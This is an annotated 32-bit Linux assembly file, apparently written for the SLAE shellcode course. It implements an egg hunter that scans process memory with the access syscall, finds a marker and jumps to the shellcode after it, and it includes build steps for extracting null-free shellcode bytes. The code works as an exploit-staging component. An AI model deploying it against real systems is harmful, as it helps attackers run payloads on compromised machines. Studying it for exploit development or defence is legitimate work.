; Executable name       : egg
; Designed OS           : Linux (32-bit)
; Author                : Skape
; Version               : 1.0
; Created Following     : SLAE
; Description		: An example of the egg hunter technique via
;			  access(2)
; Skapes awesome paper:
;	http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;
; Build using these commands:
;	make
;	./objdump2shellcode.py -d egg -f c -b "\x00"
;

SECTION .text

global _start

_start:
	mov ebx,0x50905090	; this is the EGG we will be searching for
	xor ecx,ecx		; zero out ECX, then multiply it resulting
	mul ecx			; in both EAX and EDX to  be zero'd out

next_page:
	or dx,0xfff		; bitwise OR operation on low 16 bits

next_addr:
	; int access(const char *pathname, int mode)
	inc edx			; this operation makes EDX = 0x100
	pushad			; PUSH all general purpose registers
	lea ebx,[edx+0x4]	; load address [EDX+4](0x1004) into EBX
	mov al,0x21		; place 33 into AL which is access() sycall
	int 0x80		; call the kernel
	cmp al,0xf2		; compare return value against EFAULT this
				; sets the flag state.

	popad			; POP all general purpose registers back
	jz next_page		; if the ZF flag is set, the implementation
				; jumps to OR instruction which increments
				; current pointer to next page

	cmp [edx],ebx		; otherwise if the return was not EFAULT, the
				; pointer was valid and can thus be compared
				; to the egg being searched for.

	jnz next_addr		; if they don't match loop back to next page
	cmp [edx+0x4],ebx	; compare the other 4 bytes if match JMP edx
	jnz next_addr		; if they don't match loop back to next page
	jmp edx			; JMP to our shellcode!!!!!!!!!!!!!!!!!!!!!!
